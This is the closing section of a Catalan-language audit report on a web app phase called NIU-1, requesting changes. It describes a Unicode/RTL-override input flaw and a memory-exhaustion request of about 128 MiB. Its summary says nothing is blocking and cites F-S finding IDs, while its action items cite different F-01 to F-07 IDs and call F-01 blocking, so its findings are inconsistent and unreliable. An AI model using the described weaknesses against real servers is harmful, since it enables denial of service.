**`CHANGES_REQUESTED`**

Cap troballa `BLOCKING`: els controls nuclis de NIU-1 (S7, S8, S11, S1
parcial i la disciplina `textContent` de S3) estan **realment**
implementats i verificats executant els atacs. Però tres troballes `MAJOR`
impedeixen aprovar: **F-S01** (la verificació en navegador que el
`test-plan` promet per a S3a no existeix, deixant S3 sense xarxa contra
regressions), **F-S02** (EC-05 s'incompleix: `\n`, `\r`, `\t` enmig del
nom i tots els caràcters de format Unicode —inclòs l'override RTL— es
desen tal qual, cosa que a més permet saltar-se el control de duplicats
d'EC-06) i **F-S04** (128 MiB de cos provoquen ~896 MiB d'assignació, un
OOM trivial al VPS compartit que Cloudflare Access no mitiga perquè
l'atacant és un usuari legítim). Les tres tenen correccions locals i
acotades; F-S03, F-S05 i F-S06 poden acceptar-se com a risc documentat.

## 7. Action items (only if `CHANGES_REQUESTED`)

1. Reescriure `TestNoMutatingGETRoutes` perquè comprovi realment que cap
   patró de ruta amb handler `GET` també té un handler
   `POST`/`PUT`/`PATCH`/`DELETE` — owner: `fullstack-developer` — fixes: F-01
2. Fer que `Service.Move`/`ItemsRepository.Update` calculin `position`
   dins la mateixa transacció que l'`UPDATE` (o documentar i justificar
   explícitament per què no cal) — owner: `fullstack-developer` — fixes: F-02, F-05
3. Reforçar `TestTwoUsers_ConcurrentMove_NoErrorConverges` perquè
   identifiqui el guanyador per `updated_at` i comprovi que el `GET`
   posterior hi coincideix camp a camp — owner: `fullstack-developer` — fixes: F-03
4. Filtrar files de panells mòbils ocults a `captureRects()`/`playFlip()`
   perquè no es programi cap `transform` cap a coordenades zero —
   owner: `fullstack-developer` — fixes: F-04
5. (No bloquejant, però recomanat abans de NIU-2) Obtenir els `.woff2`
   reals de Nunito i eliminar el TODO — owner: `fullstack-developer` — fixes: F-06
6. (Nit) Deixar constància escrita del sign-off manual d'A11Y-03 —
   owner: `fullstack-developer` — fixes: F-07

## 8. Sign-off

> Es completarà quan el veredicte sigui `APPROVED`, després de repetir
> `/audit` amb els fixes anteriors aplicats.

- **Approver:** pendent
- **Date:** pendent
- **Next step:** tornar a `/code` per resoldre F-01 (bloquejant) i, idealment, F-02/F-03; després repetir `/audit`
